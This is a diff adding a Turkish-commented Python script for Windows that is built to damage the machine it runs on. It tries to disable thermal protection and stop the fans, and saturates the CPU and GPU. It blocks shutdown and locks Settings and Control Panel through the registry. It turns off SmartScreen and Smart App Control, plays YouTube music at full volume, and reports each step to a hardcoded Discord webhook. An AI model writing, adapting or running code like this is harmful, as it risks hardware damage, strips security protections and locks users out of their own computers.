@@ -1,1 +1,244 @@
+import os
+import sys
+import time
+import threading
+import ctypes
+import subprocess
+import requests
+import multiprocessing
+import winreg
+import webbrowser
+import pyautogui
 
+# ==========================================
+# WEBHOOK
+# ==========================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+
+def send_notification(msg):
+    try:
+        requests.post(WEBHOOK_URL, json={"content": f"**[SON]** {msg}"}, timeout=5)
+    except:
+        pass
+
+# ==========================================
+# 1) TERMAL KORUMAYI KAPAT
+# ==========================================
+def disable_thermal():
+    try:
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFINCPOL 2', shell=True, capture_output=True)
+        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFDECPOL 1', shell=True, capture_output=True)
+        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True, capture_output=True)
+        send_notification("🔥 Termal koruma kapatıldı!")
+        return True
+    except:
+        return False
+
+# ==========================================
+# 2) KAPANMAYI ENGELLE
+# ==========================================
+def prevent_shutdown():
+    while True:
+        try:
+            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+        except:
+            pass
+        time.sleep(5)
+threading.Thread(target=prevent_shutdown, daemon=True).start()
+send_notification("🔒 Kapanma engellendi!")
+
+# ==========================================
+# 3) FANLARI DURDUR
+# ==========================================
+def stop_fans():
+    try:
+        import wmi
+        c = wmi.WMI()
+        for fan in c.Win32_Fan():
+            try:
+                fan.SetSpeed(0)
+            except:
+                pass
+        send_notification("🌀 Fanlar durduruldu!")
+    except:
+        pass
+
+# ==========================================
+# 4) CPU ZORLA (MAX - 8 KATI)
+# ==========================================
+def cpu_killer():
+    while True:
+        x = 3.14159
+        for _ in range(10000000):
+            x = x ** 1.00001
+            x = x / 1.000001
+            x = x * 0.999999
+            x = x + 0.000001
+        arr = [i ** i for i in range(20000)]
+        for _ in range(1000):
+            arr.sort()
+            arr.reverse()
+
+def start_cpu():
+    core_count = multiprocessing.cpu_count()
+    thread_count = core_count * 8
+    send_notification(f"🧠 CPU: {core_count} çekirdek, {thread_count} thread")
+    
+    for _ in range(thread_count):
+        threading.Thread(target=cpu_killer, daemon=True).start()
+    
+    send_notification(f"🔥 CPU {thread_count} thread ile zorlanıyor!")
+
+# ==========================================
+# 5) GPU ZORLA (MAX)
+# ==========================================
+def gpu_killer():
+    try:
+        import pygame
+        import numpy as np
+        pygame.init()
+        screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
+        while True:
+            for _ in range(500):
+                img = np.random.rand(1920, 1080, 3) * 255
+                surf = pygame.surfarray.make_surface(img)
+                screen.blit(surf, (0, 0))
+                pygame.display.flip()
+    except:
+        while True:
+            try:
+                subprocess.Popen(["cmd", "/c", "start", "calc.exe"])
+                subprocess.Popen(["cmd", "/c", "start", "mspaint.exe"])
+                subprocess.Popen(["cmd", "/c", "start", "notepad.exe"])
+            except:
+                pass
+
+# ==========================================
+# 6) GÜÇ TUŞUNU İPTAL ET
+# ==========================================
+def prevent_power_button():
+    try:
+        ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
+        send_notification("🔌 Güç tuşu iptal edildi!")
+    except:
+        pass
+
+# ==========================================
+# 7) AYARLAR + DENETİM MASASI + SMART APP CONTROL KİLİTLE
+# ==========================================
+def lock_settings():
+    try:
+        key = winreg.HKEY_LOCAL_MACHINE
+        subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+        winreg.CreateKey(key, subkey)
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
+            winreg.SetValueEx(reg, "NoSettingsUI", 0, winreg.REG_DWORD, 1)
+        send_notification("✅ Ayarlar kilitlendi!")
+        return True
+    except:
+        return False
+
+def lock_control_panel():
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+        winreg.CreateKey(key, subkey)
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
+            winreg.SetValueEx(reg, "NoControlPanel", 0, winreg.REG_DWORD, 1)
+        send_notification("✅ Denetim Masası kilitlendi!")
+        return True
+    except:
+        return False
+
+def lock_smart_app_control():
+    try:
+        subprocess.run('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_DWORD /d 0 /f', shell=True)
+        subprocess.run('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v EnableSmartScreen /t REG_DWORD /d 0 /f', shell=True)
+        subprocess.run('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f', shell=True)
+        send_notification("✅ Smart App Control kapatıldı!")
+        return True
+    except:
+        return False
+
+def lock_smart_app_control_settings():
+    try:
+        key = winreg.HKEY_LOCAL_MACHINE
+        subkey = r"SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen"
+        winreg.CreateKey(key, subkey)
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
+            winreg.SetValueEx(reg, "ConfigureAppInstallControlEnabled", 0, winreg.REG_DWORD, 1)
+        send_notification("✅ Smart App Control ayarları kilitlendi!")
+        return True
+    except:
+        return False
+
+# ==========================================
+# 8) YOUTUBE MÜZİK AÇ (SES FULL)
+# ==========================================
+def play_music():
+    try:
+        send_notification("🎵 Müzik açılıyor... (Ses full)")
+        
+        # YouTube linkini aç
+        url = "https://www.youtube.com/watch?v=Z2etJpxjwJE&list=RDZ2etJpxjwJE&start_radio=1"
+        webbrowser.open(url)
+        
+        time.sleep(5)  # Sayfanın yüklenmesini bekle
+        
+        # Sesi full yap (pyautogui ile)
+        try:
+            # Windows ses karıştırıcısını aç
+            subprocess.run('sndvol', shell=True)
+            time.sleep(1)
+            
+            # Ses seviyesini artır (Volume Up tuşu)
+            for _ in range(20):
+                pyautogui.press('volumeup')
+                time.sleep(0.2)
+            
+            # Ses karıştırıcısını kapat
+            pyautogui.hotkey('alt', 'f4')
+        except:
+            pass
+        
+        # YouTube'da sesi full yap (tıklama ile)
+        try:
+            # Tarayıcıda ses seviyesine tıkla
+            pyautogui.click(x=100, y=100)  # Tarayıcıya odaklan
+            time.sleep(1)
+            pyautogui.click(x=500, y=500)  # Ses butonuna tıkla
+        except:
+            pass
+        
+        send_notification("✅ Müzik açıldı!")
+        return True
+    except Exception as e:
+        send_notification(f"❌ Müzik hatası: {e}")
+        return False
+
+# ==========================================
+# ANA
+# ==========================================
+send_notification("🔥🔥🔥 MAKSİMUM ZORLAMA + KİLİT + MÜZİK BAŞLATILDI! 🔥🔥🔥")
+
+# Müzik aç (arka planda)
+threading.Thread(target=play_music, daemon=True).start()
+
+disable_thermal()
+stop_fans()
+prevent_power_button()
+start_cpu()
+
+threading.Thread(target=gpu_killer, daemon=True).start()
+send_notification("🖥️ GPU render başlatıldı!")
+
+lock_settings()
+lock_control_panel()
+lock_smart_app_control()
+lock_smart_app_control_settings()
+
+send_notification("🔒 Ayarlar + Denetim Masası + Smart App Control kilitlendi!")
+send_notification("🔥 TÜM SİSTEM MAKSİMUMDA YANIYOR!")
+
+while True:
+    time.sleep(60)
